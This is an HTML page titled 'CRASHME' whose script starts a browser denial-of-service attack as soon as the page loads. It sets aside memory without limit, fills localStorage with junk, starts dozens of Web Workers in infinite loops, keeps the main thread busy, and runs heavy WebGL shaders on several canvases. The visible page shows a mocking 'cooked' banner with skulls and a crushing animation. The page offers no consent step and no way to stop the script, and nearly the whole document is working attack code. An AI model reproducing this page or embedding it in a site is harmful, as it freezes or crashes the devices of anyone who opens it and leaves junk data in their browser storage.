<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRASHME</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 20% 30%, #ff4d4d, #1a0000);
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', 'Arial Black', system-ui, sans-serif;
            overflow: hidden;
            position: relative;
            animation: bgPulse 0.5s infinite alternate ease-in-out;
        }

        @keyframes bgPulse {
            0% { background: radial-gradient(circle at 20% 30%, #ff1a1a, #0a0000); }
            100% { background: radial-gradient(circle at 80% 70%, #ff6666, #1f0000); }
        }

        .melter-panel {
            background: rgba(10, 0, 0, 0.75);
            backdrop-filter: blur(12px) saturate(200%);
            -webkit-backdrop-filter: blur(12px) saturate(200%);
            border: 3px solid #ff8800;
            border-radius: 60px 20px 60px 20px;
            box-shadow: 0 0 60px #ff3300, 0 0 120px #ffaa00 inset;
            padding: 3rem 5rem;
            text-align: center;
            transform: rotate(1deg) scale(1.05);
            animation: panelWobble 0.2s infinite alternate, glitch 1.5s infinite;
            z-index: 100;
            position: relative;
        }

        @keyframes panelWobble {
            from { transform: rotate(0deg) scale(1.05); }
            to { transform: rotate(2deg) scale(1.1); }
        }

        @keyframes glitch {
            0% { border-color: #ff0000; text-shadow: -5px 5px 0 #00ff00; }
            20% { border-color: #00ff00; text-shadow: 5px -5px 0 #ff0000; }
            40% { border-color: #0000ff; text-shadow: -5px -5px 0 #ffff00; }
            60% { border-color: #ffff00; text-shadow: 5px 5px 0 #ff00ff; }
            80% { border-color: #ff00ff; text-shadow: -5px 5px 0 #00ffff; }
            100% { border-color: #ff8800; text-shadow: 5px -5px 0 #8800ff; }
        }

        h1 {
            font-size: 7rem;
            font-weight: 900;
            letter-spacing: 8px;
            color: #fff;
            text-transform: uppercase;
            text-shadow: 0 0 20px red, 0 0 40px orange, 4px 4px 0 black;
            margin-bottom: 20px;
            line-height: 1.1;
            animation: textFlicker 0.08s infinite;
        }

        @keyframes textFlicker {
            0% { opacity: 1; transform: skew(0deg); }
            2% { opacity: 0.8; transform: skew(2deg); }
            4% { opacity: 1; transform: skew(-2deg); }
            96% { opacity: 1; transform: skew(0deg); }
            98% { opacity: 0.9; transform: skew(3deg); }
        }

        .skull {
            font-size: 12rem;
            line-height: 1;
            filter: drop-shadow(0 0 30px #ff6600) brightness(1.3);
            animation: skullSpin 3s infinite linear, heatHaze 0.2s infinite;
        }

        @keyframes skullSpin {
            0% { transform: rotate(0deg) scale(1); }
            25% { transform: rotate(3deg) scale(1.1); }
            50% { transform: rotate(-2deg) scale(1.2); }
            75% { transform: rotate(4deg) scale(1.1); }
            100% { transform: rotate(-1deg) scale(1); }
        }

        @keyframes heatHaze {
            0% { transform: translate(0px, 0px); }
            25% { transform: translate(2px, -1px); }
            50% { transform: translate(-2px, 2px); }
            75% { transform: translate(1px, -2px); }
            100% { transform: translate(-1px, 1px); }
        }

        .temp-gauge {
            margin-top: 20px;
            font-size: 2rem;
            color: #ffb347;
            text-shadow: 0 0 10px red;
            border-top: 2px dashed #ff6666;
            padding-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
        }

        .temp-gauge span {
            background: #300;
            padding: 10px 20px;
            border-radius: 40px;
            font-weight: bold;
            border: 1px solid orange;
            box-shadow: 0 0 20px orange;
            animation: gaugeBlink 0.3s infinite alternate;
        }

        @keyframes gaugeBlink {
            from { background: #300; border-color: #ff6600; }
            to { background: #600; border-color: #ffcc00; }
        }


        #waterCrushCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 50;
            pointer-events: none;
            opacity: 0.9;
        }


        .gpu-torture {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            opacity: 0.15;
            mix-blend-mode: screen;
            z-index: 1;
        }

        canvas {
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        #glCanvas1 { z-index: 1; }
        #glCanvas2 { z-index: 2; }
        #glCanvas3 { z-index: 3; }
    </style>
</head>
<body>


    <div class="melter-panel">
        <h1>cooked</h1>
        <div class="skull">💀💀💀</div>
        <div class="temp-gauge">
            <span>CPU 100%</span>
            <span>RAM 100%</span>
            <span>GPU 100%</span>
        </div>
        <div style="margin-top: 20px; color: #aaa; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 4px;">system melting ...</div>
    </div>


    <div class="gpu-torture">
        <canvas id="glCanvas1"></canvas>
        <canvas id="glCanvas2"></canvas>
        <canvas id="glCanvas3"></canvas>
    </div>


    <canvas id="waterCrushCanvas"></canvas>

    <script>
        (function() {
            (function ramTorture() {
                try {
                    const megaBytes = 1024 * 1024;
                    let storage = [];
                    
                    function allocateChunk(sizeMB) {
                        try {
                            let buf = new ArrayBuffer(sizeMB * megaBytes);
                            let view = new Uint8Array(buf);
                            for (let i = 0; i < view.length; i += 4096) {
                                view[i] = 0xcc;
                            }
                            storage.push(buf);
                        } catch (e) {}
                    }

                    let interval = setInterval(() => {
                        for (let i = 0; i < 5; i++) {
                            allocateChunk(200);
                        }
                    }, 50);

                    for (let i = 0; i < 100; i++) {
                        try {
                            localStorage.setItem('garbage' + i, 'x'.repeat(1024 * 1024));
                        } catch (e) {}
                    }
                    window.ramInterval = interval;
                } catch (e) { }
            })();


            (function cpuTorture() {
                let coreCount = navigator.hardwareConcurrency || 8;
                let workerCount = Math.min(coreCount * 2, 32);

                const workerBlob = new Blob([`
                    function wasteTime() {
                        let x = 1.0;
                        let y = 3.14159;
                        let z = 0;
                        while(true) {
                            for(let i=0; i<1000; i++) {
                                x = Math.sin(x) * Math.cos(y) + Math.sqrt(Math.abs(x + y));
                                y = Math.atan2(x, y) * Math.tan(z);
                                z = Math.pow(x + y, 0.234) + Math.log(Math.abs(x) + 1);
                                let a = 123456789;
                                let b = 987654321;
                                a = (a * b) >>> 0;
                                b = (b ^ a) + (a << 16);
                            }
                            let garbage = new Array(5000).fill(Math.random());
                        }
                    }
                    wasteTime();
                `], { type: 'application/javascript' });

                const workerUrl = URL.createObjectURL(workerBlob);
                for (let i = 0; i < workerCount; i++) {
                    try {
                        let w = new Worker(workerUrl);
                        if (!window.cpuWorkers) window.cpuWorkers = [];
                        window.cpuWorkers.push(w);
                    } catch (e) { }
                }

                function mainThreadBurn() {
                    let ts = Date.now();
                    while (Date.now() - ts < 200) {
                        Math.random() * Math.random();
                        Math.sin(Math.cos(Math.random()));
                    }
                    setTimeout(mainThreadBurn, 5);
                }
                mainThreadBurn();
            })();

            (function gpuTorture() {
                const canvases = [
                    document.getElementById('glCanvas1'),
                    document.getElementById('glCanvas2'),
                    document.getElementById('glCanvas3')
                ];

                const fragmentShaderSource = `
                    precision highp float;
                    varying vec2 vUv;
                    uniform float time;
                    float chaos(vec2 p) {
                        float val = 0.0;
                        vec2 z = p;
                        for (int i = 0; i < 500; i++) {
                            z = vec2( z.x*z.x - z.y*z.y + p.x, 2.0*z.x*z.y + p.y );
                            val += length(z) * 0.001;
                            if (length(z) > 2.0) break;
                        }
                        return val;
                    }
                    void main() {
                        vec2 uv = vUv * 4.0 - 2.0;
                        uv.x += sin(time * 0.7) * 0.5;
                        uv.y += cos(time * 0.3) * 0.5;
                        float c = 0.0;
                        for (int j = 0; j < 30; j++) {
                            float t = float(j) * 0.1;
                            vec2 offset = vec2(sin(time + t), cos(time + t * 2.0)) * 0.3;
                            c += chaos(uv + offset) * (0.5 + 0.5 * sin(time * 2.0));
                        }
                        c += sin(uv.x * 50.0 + time) * cos(uv.y * 50.0 - time) * 0.5;
                        gl_FragColor = vec4(1.0, c * 0.5, c * 0.2, 1.0);
                    }
                `;

                const vertexShaderSource = `
                    attribute vec2 position;
                    varying vec2 vUv;
                    void main() {
                        vUv = position * 0.5 + 0.5;
                        gl_Position = vec4(position, 0.0, 1.0);
                    }
                `;

                function setupCanvas(canvas) {
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return null;

                    canvas.width = window.innerWidth;
                    canvas.height = window.innerHeight;

                    const vs = gl.createShader(gl.VERTEX_SHADER);
                    gl.shaderSource(vs, vertexShaderSource);
                    gl.compileShader(vs);
                    const fs = gl.createShader(gl.FRAGMENT_SHADER);
                    gl.shaderSource(fs, fragmentShaderSource);
                    gl.compileShader(fs);
                    const program = gl.createProgram();
                    gl.attachShader(program, vs);
                    gl.attachShader(program, fs);
                    gl.linkProgram(program);
                    gl.useProgram(program);

                    const positions = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
                    const buffer = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                    gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);

                    const posLoc = gl.getAttribLocation(program, 'position');
                    gl.enableVertexAttribArray(posLoc);
                    gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);

                    const timeLoc = gl.getUniformLocation(program, 'time');

                    function render(now) {
                        if (canvas.width !== window.innerWidth || canvas.height !== window.innerHeight) {
                            canvas.width = window.innerWidth;
                            canvas.height = window.innerHeight;
                            gl.viewport(0, 0, canvas.width, canvas.height);
                        }
                        gl.uniform1f(timeLoc, now * 0.001);
                        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                        requestAnimationFrame(render);
                    }
                    requestAnimationFrame(render);
                    return gl;
                }

                canvases.forEach(canvas => {
                    if (canvas) setupCanvas(canvas);
                });

                let extraCanvas = document.createElement('canvas');
                extraCanvas.style.position = 'fixed';
                extraCanvas.style.top = '0';
                extraCanvas.style.left = '0';
                extraCanvas.style.width = '100%';
                extraCanvas.style.height = '100%';
                extraCanvas.style.pointerEvents = 'none';
                extraCanvas.style.opacity = '0.1';
                document.body.appendChild(extraCanvas);
                setupCanvas(extraCanvas);
            })();


            (function waterCrushSimulation() {
                const canvas = document.getElementById('waterCrushCanvas');
                const ctx = canvas.getContext('2d');

                let width, height;
                function resize() {
                    width = canvas.width = window.innerWidth;
                    height = canvas.height = window.innerHeight;
                }
                window.addEventListener('resize', resize);
                resize();


                const particles = [];
                const PARTICLE_COUNT = 400;
                const BOY_CENTER = { x: width * 0.5, y: height * 0.4 };
                const BOY_RADIUS = 50;


                let handY = -200;
                const HAND_WIDTH = 180;
                const HAND_HEIGHT = 100;
                const HAND_SPEED = 0.3;
                let crushPhase = 0; 
                let splashActive = false;


                for (let i = 0; i < PARTICLE_COUNT; i++) {
                    let angle = Math.random() * 2 * Math.PI;
                    let dist = Math.random() * BOY_RADIUS * 1.2;
                    particles.push({
                        x: BOY_CENTER.x + Math.cos(angle) * dist,
                        y: BOY_CENTER.y + Math.sin(angle) * dist * 0.5,
                        vx: (Math.random() - 0.5) * 2,
                        vy: (Math.random() - 0.5) * 2,
                        life: 1.0,
                        size: 2 + Math.random() * 4,
                    });
                }

                function update() {
                
                    if (crushPhase === 0) {
                        handY += HAND_SPEED * 2;
                        if (handY >= BOY_CENTER.y - BOY_RADIUS) {
                            crushPhase = 1; 
                            splashActive = true;
                        }
                    } else if (crushPhase === 1) {
                        handY += HAND_SPEED * 3;
                        if (handY >= BOY_CENTER.y + BOY_RADIUS * 2) {
                            crushPhase = 2;
                        }
                 
                        for (let p of particles) {
                            let dx = p.x - (BOY_CENTER.x - 20 + Math.random() * 40);
                            let dy = p.y - (handY - HAND_HEIGHT/2);
                            let dist = Math.hypot(dx, dy);
                            if (dist < HAND_WIDTH/2) {
                                let force = (HAND_WIDTH/2 - dist) * 0.02;
                                p.vx += dx * force * 0.1;
                                p.vy += dy * force * 0.1;
                                p.life -= 0.005;
                            }
                        }
                    } else if (crushPhase === 2) {
                        handY += HAND_SPEED * 1.5;
                        if (handY > height + 200) {
                            handY = -200;
                            crushPhase = 0;
                     
                            for (let p of particles) {
                                let angle = Math.random() * 2 * Math.PI;
                                let dist = Math.random() * BOY_RADIUS * 1.2;
                                p.x = BOY_CENTER.x + Math.cos(angle) * dist;
                                p.y = BOY_CENTER.y + Math.sin(angle) * dist * 0.5;
                                p.vx = (Math.random() - 0.5) * 2;
                                p.vy = (Math.random() - 0.5) * 2;
                                p.life = 1.0;
                            }
                        }
                    }

                
                    for (let p of particles) {
                        p.x += p.vx;
                        p.y += p.vy;
                        p.vy += 0.1; 
                        p.vx *= 0.99;
                        p.vy *= 0.99;
                        p.life *= 0.998;

                    
                        if (p.x < 0 || p.x > width) p.vx *= -0.5;
                        if (p.y < 0) p.vy *= -0.5;
                        if (p.y > height) p.life = 0;

                 
                        if (p.life < 0.01 || p.y > height + 100) {
                            let angle = Math.random() * 2 * Math.PI;
                            let dist = Math.random() * BOY_RADIUS * 1.2;
                            p.x = BOY_CENTER.x + Math.cos(angle) * dist;
                            p.y = BOY_CENTER.y + Math.sin(angle) * dist * 0.5;
                            p.vx = (Math.random() - 0.5) * 2;
                            p.vy = (Math.random() - 0.5) * 2;
                            p.life = 1.0;
                        }
                    }
                }

                function draw() {
                    ctx.clearRect(0, 0, width, height);

                
                    for (let p of particles) {
                        ctx.beginPath();
                        ctx.arc(p.x, p.y, p.size * p.life, 0, Math.PI * 2);
                        ctx.fillStyle = `rgba(64, 164, 223, ${p.life * 0.8})`;
                        ctx.shadowColor = '#aaddff';
                        ctx.shadowBlur = 10;
                        ctx.fill();
                    }
                    ctx.shadowBlur = 0;

               
                    ctx.beginPath();
                    ctx.arc(BOY_CENTER.x, BOY_CENTER.y, BOY_RADIUS, 0, Math.PI * 2);
                    ctx.fillStyle = '#3a9eff';
                    ctx.shadowColor = '#fff';
                    ctx.shadowBlur = 20;
                    ctx.fill();
                    ctx.shadowBlur = 0;
                    ctx.strokeStyle = '#ffffff';
                    ctx.lineWidth = 4;
                    ctx.stroke();

                
                    ctx.fillStyle = '#000';
                    ctx.beginPath();
                    ctx.arc(BOY_CENTER.x - 15, BOY_CENTER.y - 10, 5, 0, 2*Math.PI);
                    ctx.fill();
                    ctx.beginPath();
                    ctx.arc(BOY_CENTER.x + 15, BOY_CENTER.y - 10, 5, 0, 2*Math.PI);
                    ctx.fill();

                  
                    ctx.beginPath();
                    if (crushPhase > 0) {
                        ctx.arc(BOY_CENTER.x, BOY_CENTER.y + 10, 15, 0, Math.PI, false);
                    } else {
                        ctx.arc(BOY_CENTER.x, BOY_CENTER.y + 10, 10, 0, Math.PI, false);
                    }
                    ctx.strokeStyle = '#000';
                    ctx.lineWidth = 3;
                    ctx.stroke();

                  
                    ctx.fillStyle = '#8b5a2b';
                    ctx.shadowColor = '#5a3e1a';
                    ctx.shadowBlur = 15;
                    ctx.beginPath();
                    ctx.ellipse(BOY_CENTER.x - 20, handY, HAND_WIDTH/2, HAND_HEIGHT/2, 0, 0, Math.PI*2);
                    ctx.fill();
                  
                    ctx.fillStyle = '#a8753a';
                    for (let i = 0; i < 5; i++) {
                        let x = BOY_CENTER.x - 40 + i * 20;
                        let y = handY - 15;
                        ctx.beginPath();
                        ctx.ellipse(x, y, 15, 25, 0, 0, Math.PI*2);
                        ctx.fill();
                    }
                    ctx.shadowBlur = 0;
                }

                function animate() {
                    update();
                    draw();
                    requestAnimationFrame(animate);
                }
                animate();
            })();
        })();
    </script>
</body>
</html>
